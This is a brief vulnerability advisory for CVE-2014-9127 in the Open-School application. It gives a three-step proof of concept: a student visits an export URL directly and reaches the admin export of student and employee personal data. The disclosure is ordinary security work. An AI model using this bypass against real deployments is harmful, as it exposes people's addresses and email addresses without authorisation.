Access control bypass from student portal to access administration interface - CVE-2014-9127
---------------------------------------------------------------------------------------------

The application only allows the admin user to export students and employee database which contain personal information such as address and email address.

Any students that have access to student portal can bypass the access control by directly visiting the export link.
This functionality was not available in community edition and was tested on the demo version provided by Open-School team.
Proof of concept:
1.  Login to student portal as students
2.  Go to http://tryopenschool.com/index.php?r=export
3.  Observe the export function is now accessible to students
